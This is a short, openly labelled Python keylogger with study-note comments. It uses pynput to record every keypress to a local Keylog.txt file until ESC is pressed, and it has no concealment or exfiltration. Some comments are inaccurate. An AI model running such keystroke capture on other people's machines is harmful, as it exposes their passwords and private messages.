# Storing the keystrokes in a text file
# File Handling: (r)ead,(w)rite,(e)xecute, (a) append, a+ append&readmode
# line 5 imports the keyboard module from pynput library: is used for controlling and monitoring input devices

from pynput import keyboard
# Create a log file; captures keystrokes being stored
log_file = "Keylog.txt"

#share variable to control listener
running = True # keylogger continues to listen for keypress

# Define the functions that will be called whenever a key is pressed
def on_press(key):
    global running

    #tryblock;executes the code inside the block
    # 'with' keyword - release memory/resoucres automatically
    try:
      
        with open(log_file, "a") as f: # a: to append
            f.write(f"{key.char}") #key.char is used to get character of the keys pressed alphanumeric key
    except AttributeError: #exemptblock handles different types of keys pressed 'special'
        with open(log_file, "a") as f:
            f.write(f" {" "} ") #write special key (space) in the log file

#stop listener if "ESC" key is pressed
    if key == keyboard.Key.esc:
        running = False
        return False #stop listener

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

listener.stop()
listener.join() #starts the listening
